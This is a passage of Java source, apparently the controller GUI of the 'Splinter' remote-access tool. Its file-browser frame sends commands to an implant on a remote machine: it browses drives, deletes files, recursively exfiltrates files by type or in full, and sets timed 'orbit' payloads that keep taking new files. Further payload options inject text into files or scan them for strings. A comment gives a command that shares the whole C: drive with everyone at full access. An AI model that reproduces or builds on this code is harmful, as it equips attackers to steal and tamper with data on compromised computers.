						//Splinter_GUI.jpnlMainController.jtfCommand_Broadcast.setText(Driver.ORBIT_DIRECTORY + ", " + orbitPath.trim() + ", " + fileTypes + ", " + enableRecursive);//paste command
						//Splinter_GUI.jpnlMainController.broadcastCommand();//send command
						this.myThread.sendCommand_RAW(Driver.ORBIT_DIRECTORY + ", " + orbitPath.trim() + ", " + fileTypes + ", " + enableRecursive + ", " + delyMillis);//paste command
						
					
					}catch(Exception ee){Drivers.sop("UNABLE TO SEND ORBIT COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");}
				}
				else
				{
					this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
				}
				
				
				
			}
			
			else if(ae.getSource() == jbtnExfilFilesByType)
			{
				String orbitPath = queryOrbitDirectoryPath("Extract");
				
				if(orbitPath != null && queryRecursiveOrbitDirectory(orbitPath) > -1)
				{
					//we know the user wants to continue to exfil from this directory
										
					//enableRecursive is set by the above method
					
					//get the file types to exfil
					String fileTypes = queryOrbitDirectoryFileTyes();
					
					this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: " + "\"" + orbitPath + "\"" + " Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + enableRecursive, Drivers.clrController, Drivers.clrBackground);
					
					//send the orbiter command!
					try
					{
						this.myThread.sendCommand_RAW(Driver.EXFIL_DIRECTORY + ", " + orbitPath.trim() + ", " + fileTypes + ", " + enableRecursive);//paste command					
					
					}catch(Exception ee){Drivers.sop("UNABLE TO SEND EXTRACTION COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");}
				}
				else
				{
					this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
				}
				
			}
			
			else if(ae.getSource() == jbtnExfilAllFiles)
			{
				String orbitPath = queryOrbitDirectoryPath("Extract");
				
				if(orbitPath != null && queryRecursiveOrbitDirectory(orbitPath) > -1)
				{
					//we know the user wants to continue to exfil from this directory
										
					//enableRecursive is set by the above method
					
					//get the file types to exfil
					String fileTypes = "*.*";
					
					this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: " + "\"" + orbitPath + "\"" + " Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + enableRecursive, Drivers.clrController, Drivers.clrBackground);
					
					//send the orbiter command!
					try
					{
						this.myThread.sendCommand_RAW(Driver.EXFIL_DIRECTORY + ", " + orbitPath.trim() + ", " + fileTypes + ", " + enableRecursive);//paste command					
					
					}catch(Exception ee){Drivers.sop("UNABLE TO SEND EXTRACTION COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");}
				}
				else
				{
					this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
				}
				
			}
			
			
			else if(ae.getSource() == jbtnCancel)
			{
				Drivers.jop("Feature not implemented yet...");
			}
			
			else if(ae.getSource() == jbtnExecute)
			{
				executeShortcut();
			}
			
			else if(ae.getSource() == jbtnOpen)
			{
				Drivers.jop("Feature not implemented yet...");
			}
			
			else if(ae.getSource() == jtblFileBrowser.jcbFileRoots)
			{
				this.myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.alCurrFileRoots.get(jtblFileBrowser.jcbFileRoots.getSelectedIndex()).myFile_fle);
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnMoveUpDirectory)
			{
				//myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.alCurrFileRoots.get(jtblFileBrowser.jcbFileRoots.getSelectedIndex()).myFile_UpDirectory);
				/*try
				{
					myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.alCurrFileList.get(alCurrFileRoots.size()-1).myFile_UpDirectory);
				}
				catch(Exception e)
				{
					myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.alCurrFileList.get(jtblFileBrowser.jcbFileRoots.getSelectedIndex()).myFile_UpDirectory);
				}*/
				
				if(this.alCurrFileList.size() < 1)//used if empty directory is passed in
				{
					myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.objFileBrowser_EmptyDirectory.myFile_parentDirectory);
				}
				else//just as before, update as normal
				{
					myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + this.alCurrFileList.get(0).myFile_UpDirectory);
				}
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnNewDirectory)
			{
				//query user for new folder
				String folderName = Drivers.jop_Query("New Folder Name:", "New Folder Creation");
				if(folderName == null || folderName.trim().equals(""))
				{
					Drivers.jop_Error("No data entered for folder creation", "Unable to continue selected option");
					//return false;
				}
				else
				{
					//otherwise, we have a good entry, attempt to create the directory																
					
					//need to check if we're using the empty directory, or the arraylist to specify the file creation
					if(this.alCurrFileList.size() < 1)
					{
						myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_CREATE_DIRECTORY +  Driver.delimeter_1 + this.objFileBrowser_EmptyDirectory.myFile_fle + Driver.delimeter_1 + folderName);
					}
					else
					{
						myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_CREATE_DIRECTORY +  Driver.delimeter_1 + this.alCurrFileList.get(0).myFile_parentDirectory + Driver.delimeter_1 + folderName);
					}
					
					
					
				}
				
					
				
				
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnDelete)
			{
				//first ensure the user selected a directory to remove
				int selectedIndex = this.jtblFileBrowser.getSelectedRowIndex();
				
				if(selectedIndex < 0)
				{
					Drivers.jop_Error("You must first select a file in order to continue", "Unable to Complete Selected Action");
				}
				
				//get the file browser object
				Object_FileBrowser fleToDelete = getSelectedFileObject_From_JTable();
				
				if(fleToDelete == null)
				{
					this.jtxtpne_ConsoleOut.appendString(true, "", "No Row selected!", Drivers.clrImplant, Drivers.clrBackground);
					Drivers.jop_Error("Invalid File Selected", "Unable to Complete Selected Action");
				}
				
				else if(fleToDelete.i_am_a_drive)
				{
					Drivers.jop("Can not delete a drive!!!!!!!!!!!!");
				}
				
				else//we have a good file object, send deletion command
				{
					String deletionPrompt = "";
					
					if(fleToDelete.i_am_a_directory)
					{
						deletionPrompt = "Confirm Deletion of " + fleToDelete.myFile_fullPath + " and all files under this directory";
					}
					else
					{
						deletionPrompt = "Confirm Deletion of " + fleToDelete.myFile_fullPath;
					}
					
					if(Drivers.jop_Confirm(deletionPrompt, "Delete File") == JOptionPane.YES_OPTION)
					{						
						myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_DELETE_DIRECTORY +  Driver.delimeter_1 + fleToDelete.myFile_fle);
					
					}
					
					else
					{
						this.jtxtpne_ConsoleOut.appendString(true, ""+myThread.getId(), "File deletion \"" + fleToDelete.myFile_fullPath + "\" cancelled for thread " + this.myThread.getId(), Drivers.clrImplant, Drivers.clrBackground);
						 
					}
				}
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnRefresh)
			{
				Drivers.jop("Feature not implemented yet...");
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnSearch)
			{
				Drivers.jop("Feature not implemented yet...");
			}
			
			else if(ae.getSource() == jtblFileBrowser.jbtnShare)
			{
				//command: net share sharename=c:\ /grant:everyone, full
				
				Drivers.jop("Feature not implemented yet...");
			}
			
			else if(ae.getSource() == this.jtblFileBrowser.jtfCurrentPath)
			{
				this.myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + " " + this.jtblFileBrowser.jtfCurrentPath.getText().trim());
				
			}
			
			else if(ae.getSource() == this.jcbCurrentDirectoryFilter)
			{
				String selection = "";
				selection = (String)jcbCurrentDirectoryFilter.getSelectedItem();
				
				if(selection != null)
				{
					//remove all items
					this.jtblFileBrowser.removeAllRows();
					
					//add files matching this extension
					for(int i = 0; i < alCurrFileList.size(); i++)
					{
						if(alCurrFileList.get(i).myFileExtension_withoutPeriod.equalsIgnoreCase(selection))
						{
							this.jtblFileBrowser.addRow(alCurrFileList.get(i).getJTableRowData());
						}
						else if(selection.trim().equals("")) //otherwise, add all files
						{
							this.jtblFileBrowser.addRow(alCurrFileList.get(i).getJTableRowData());
						}
					}
					
					//update the filter
					try{	jtblFileBrowser.sortJTable();}catch(Exception e){}
					
				}
			}
			
			else if(ae.getSource() == jrbPayload_Extractor)
			{
				payloadQuickReference = "Extract";
				//setTitledBorderText(jpnlDataExfiltration_FileTypes, "File Types");  
				DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_EXTRACTOR_PAYLOAD;
				
				this.jtfDataExfiltrationContentType.setText("*.*");
				this.jtfDataExfiltrationContentType.setEditable(false);
				jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());
			}
			
			else if(ae.getSource() == jrbPayload_Alerter)
			{
				//setTitledBorderText(jpnlDataExfiltration_FileTypes, "File Types");
				payloadQuickReference = "Alert on File Creation";
				DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_ALERTER_PAYLOAD;
				
				this.jtfDataExfiltrationContentType.setText("*.*");
				this.jtfDataExfiltrationContentType.setEditable(false);
				jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());
			}
			
			else if(ae.getSource() == jrbPayload_Injector)
			{
				//setTitledBorderText(jpnlDataExfiltration_FileTypes, "Contents");
				payloadQuickReference = "Inject Text";
				DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_INJECTOR_PAYLOAD;
				this.jtfDataExfiltrationContentType.setEditable(true);
				jtfDataExfiltrationContentType.setBackground(Color.white);
			}
			
			else if(ae.getSource() == jrbPayload_Inspector)
			{
				//setTitledBorderText(jpnlDataExfiltration_FileTypes, "Contents");
				payloadQuickReference = "Inspect for Character Sequence";
				DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_INSPECTOR_PAYLOAD;
				this.jtfDataExfiltrationContentType.setEditable(true);
				jtfDataExfiltrationContentType.setBackground(Color.white);
			}
			
			else if(ae.getSource() == jrbPayload_Selector)
			{
				
				//setTitledBorderText(jpnlDataExfiltration_FileTypes, "Contents");
				payloadQuickReference = "Extract";
				DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_SELECTOR_PAYLOAD;
				this.jtfDataExfiltrationContentType.setEditable(true);
				jtfDataExfiltrationContentType.setBackground(Color.white);
			}
			
			else if(ae.getSource() == jrbOrbiter_Disabled)
			{
				this.orbiterEnabled = false;
			}
			
			else if(ae.getSource() == jrbOrbiter_Enabled)
			{
				//payloadQuickReference = "Orbit";
				this.orbiterEnabled = true;
			}
			
			else if(ae.getSource() == jbtnExecute_Exfiltration)
			{
				establishDataExfiltration();
				//this.jtxtpne_ConsoleOut.appendString(true, "", "Enabling Data Exfiltration Payload: "  + DATA_EXFIL_PAYLOAD_SPECIFICATION + ", " + queryOrbitDirectoryPath(payloadQuickReference) + ", " + jtfDataExfiltrationFileType.getText().trim() + ", " + this.jtfDataExfiltrationContentType.getText().trim() + ", " + this.orbiterEnabled + ", " + "Quering user for Parameters...", Drivers.clrController, Drivers.clrBackground);
			}
			
			else if(ae.getSource() == this.folderRecursion_Enabled)
			{
				this.folderRecursionEnabled = true;
			}
			
			else if(ae.getSource() == this.folderRecursion_Disabled)
			{
				this.folderRecursionEnabled = false;
			}
			
			else if(ae.getSource() == this.jtfDataExfiltrationFileType)
			{
				this.jtxtpne_ConsoleOut.appendString(true, "", "Please select the " + this.jbtnExecute_Exfiltration.getText() + " button to continue", Drivers.clrController, Drivers.clrBackground);
			}
			
			else if(ae.getSource() == this.jtfDataExfiltrationContentType)
			{
				this.jtxtpne_ConsoleOut.appendString(true, "", "Please select the " + this.jbtnExecute_Exfiltration.getText() + " button to continue", Drivers.clrController, Drivers.clrBackground);
			}
			
		}
		catch(Exception e)
		{
			Drivers.eop("actionPerformed", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		this.validate();
	}
	
	public boolean establishDataExfiltration()
	{
		try
		{
			String strExfiltrationPath = queryOrbitDirectoryPath(payloadQuickReference);
			String strExfiltrationFileType = jtfDataExfiltrationFileType.getText().trim();
			String strExfiltrationContentType = this.jtfDataExfiltrationContentType.getText().trim();			
			
			
			this.jtxtpne_ConsoleOut.appendString(true, "", "Enabling Data Exfiltration Payload: "  + DATA_EXFIL_PAYLOAD_SPECIFICATION + ", " + strExfiltrationPath + ", " + strExfiltrationFileType + ", " + strExfiltrationContentType + ", " + this.orbiterEnabled + ", " + "Quering user for Parameters...", Drivers.clrController, Drivers.clrBackground);
			
			//FORMAT: [DATA_EXFIL_PAYLOAD_SPECIFICATION], [Exfiltration file path] 
			this.myThread.sendCommand_RAW(DATA_EXFIL_PAYLOAD_SPECIFICATION + ", " + strExfiltrationPath + ", " + strExfiltrationFileType + ", " + strExfiltrationContentType + ", " + this.orbiterEnabled); 
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("establishDataExfiltration", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean setTitledBorderText(JPanel jpnlToChangeBorderTitle, String title)
	{
		try
		{
			((TitledBorder)(jpnlToChangeBorderTitle.getBorder())).setTitle(title);		
			jpnlToChangeBorderTitle.repaint();
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("setTitledBorderText", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public int queryDelayInterval_Millis()
	{
		try
		{
			int selection = Drivers.jop_Confirm("Press YES if you want the directory scan interval to be measured in seconds... otherwise minutes will be the default wake interval", "Specify Seconds or Minutes for Exfiltration Timing Interval");
			
			int millisFactor = 60 * 1;
			
			String query = "Please enter your timing interval ";
			
			if(selection == JOptionPane.YES_OPTION)
			{
				millisFactor = 1;
				query = query + "in [seconds]";
			}
			else
			{
				query = query + "in [minutes]";
			}						
			
			int delay = millisFactor * Integer.parseInt(Drivers.jop_Query(query, "Enter Timing Interval"));
			
			
			
			return delay;
		}
		catch(Exception e)
		{
			Drivers.jop("Invalid input specified!!!");
		}
		
		return queryDelayInterval_Millis();
	}
	
	public String queryOrbitDirectoryPath(String extractionType)
	{
		try
		{
			//get the current directory path
			String orbitDirectoryPath = this.strCurrentPath;
			
			//update the path accordingly
			if(orbitDirectoryPath == null || this.alCurrFileList.size() > 0)
			{
				orbitDirectoryPath = this.alCurrFileList.get(0).myFile_parentDirectory;
			}
			
			//get the orbit directory
			//next, check if user selected a file from the JTable First
			objOrbitFileDirectory = getSelectedFileObject_From_JTable();
			
			//if that is null, check if the user selected a file from the jcombobox
			if(objOrbitFileDirectory != null)
			{
				if(objOrbitFileDirectory.i_am_a_file)			
					orbitDirectoryPath = objOrbitFileDirectory.myFile_parentDirectory;
				
				else
					orbitDirectoryPath = objOrbitFileDirectory.myFile_fullPath;
			}
					
			
			if(Drivers.jop_Confirm(extractionType + " Directory Path is indicated as: \n" + "\"" + orbitDirectoryPath + "\"" + "\nIs this the correct directory you wish to " + extractionType + "?\n", "Confirm " + extractionType + " Directory") == JOptionPane.YES_OPTION)
			{
				return orbitDirectoryPath;
			}
			
			//else, user declined the currently indicated directory, return null for them to select another directory
			return null;
		}
		
		catch(Exception e)
		{
			Drivers.eop("queryOrbitDirectoryPath", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return null;
		
		
	}
	
	public String queryOrbitDirectoryFileTyes()
	{
		try
		{
			String fileTypes = Drivers.jop_Query("Please enter Single File Type to exfiltrate \nExamples include:\n  *.*  \n  *.doc  \n  *.doc*  \n  *.*do  \n  *.*do*  \n  *word*.doc*  \n  etc...  \n ", "Specify File Type to Exfiltrate");
			
			if(fileTypes == null || fileTypes.trim().equals(""))
				return queryOrbitDirectoryFileTyes();
			
			if(fileTypes.contains("/") || fileTypes.contains("\\") || fileTypes.contains(":") || fileTypes.contains("?") || fileTypes.contains("<") || fileTypes.contains(">") || fileTypes.contains("|") || fileTypes.contains("\""))
			{
				Drivers.jop("Invalid Characters Entered for Orbiter Payload File Type Specification");
				return queryOrbitDirectoryFileTyes();
			}
			
			if(fileTypes.trim().length() > 100)
			{
				Drivers.jop("Invalid Characters Entered for Orbiter Payload File Type Specification\nMaximum length allowed at this time is 100 characters");
				return queryOrbitDirectoryFileTyes();
			}
			
			fileTypes = fileTypes.trim();
			
			//normalize input
			if(fileTypes.equals("*"))
			{
				fileTypes = "*.*";
			}
			
			else if(!fileTypes.contains("."))
			{
				fileTypes = "*." + fileTypes;
			}
			
			//else, trust what the user enters....... there's just too much to test for
			return fileTypes;
		}
		catch(Exception e)
		{
			Drivers.eop("queryOrbitDirectoryFileTyes", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return "";
		
		
		
		
		
	}
	
	public int queryRecursiveOrbitDirectory(String path)
	{				
		String query = "Do you wish to include all sub-directories under selected Folder?";
		
		if(path != null)
		{
			query = "Do you wish to include all sub-directories under \"" + path + "\"?";
		}
		
		int selection = Drivers.jop_Confirm_YES_NO_CANCEL(query, "Enable Recursive Exfiltration");
		
		enableRecursive = false;
		
		if(selection == JOptionPane.YES_OPTION)
		{
			enableRecursive = true;						
		}
		
		else if(selection == JOptionPane.NO_OPTION)
		{
			enableRecursive = false;			
		}
		else//user canceled selection
		{
			selection = -1;
			//this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);			
		}
						
		return selection;
	}
	
	public boolean updateFileList()
	{
		try
		{
			//first, loop for drives, then loop for directories, then loop for files.... yes i know, inefficient... whatev.... it's a free prog!
			this.jtblFileBrowser.removeAllRows();
			
			if(alCurrFileList.size() < 1)
			{
				if(emptyDirectoryPath_only_used_if_alCurrFileList_is_empty == null)
				{
					emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = "";
				}
				
				emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = emptyDirectoryPath_only_used_if_alCurrFileList_is_empty.trim();
				
				strCurrentPath = emptyDirectoryPath_only_used_if_alCurrFileList_is_empty;
				this.jtblFileBrowser.jtfCurrentPath.setText(emptyDirectoryPath_only_used_if_alCurrFileList_is_empty);
				return true;
			}
			
			//first loop to add all drives
			for(int i = 0; i < this.alCurrFileList.size(); i++)
			{
				this.jtblFileBrowser.addRow(alCurrFileList.get(i).getJTableRowData());
			}
			
			//update the filter
			try{	jtblFileBrowser.sortJTable();}catch(Exception e){}
			
			//update the current folder path!
			try 
			{
				strCurrentPath = this.alCurrFileList.get(0).myFile_parentDirectory;
				this.jtblFileBrowser.jtfCurrentPath.setText(this.alCurrFileList.get(0).myFile_parentDirectory);
				 
			}catch(Exception e) {this.jtblFileBrowser.jtfCurrentPath.setText("");}
			
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("updateFileList", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public void itemStateChanged(ItemEvent ie)
	{
		try
		{

			/*if(ie.getSource() == this.jcbShortcuts)
			{
				Drivers.jop("Feature not implemented yet...");
			}*/
			
			
			if(ie.getSource() == this.jtblFileBrowser.jcbFileRoots)
			{
				Drivers.jop("Feature not implemented yet...");
			}
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("ie", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	
	@Override
	public void keyTyped(KeyEvent ke) 
	{
		try
		{
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("KeyTyped", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	
	@Override
	public void keyPressed(KeyEvent ke) 
	{
		try
		{
			if(ke.getKeyCode() == ke.VK_TAB)
			{
				//do the same action if it is one of our jtext fields
				if(ke.getSource() == this.jtblFileBrowser.jtfCurrentPath)
				{
					Drivers.jop("Got it! Ready to search through received directories");
				}
				
				try{	this.jtblFileBrowser.jtfCurrentPath.grabFocus();}catch(Exception e){}//bring the focus back on this widget
				
				
			}
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("keyPressed", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	

	@Override
	public void keyReleased(KeyEvent ke) 
	{
		try
		{
			
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("keyReleased", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	
	public void closeFrame()
	{
		try
		{
			myThread.frameFileBrowserIsDisposed = true;
			
		}
		catch(Exception e)
		{
			Drivers.eop("closeFrame", strMyClassName, e, e.getLocalizedMessage(), false);
			this.dispose();
		}
	}

}
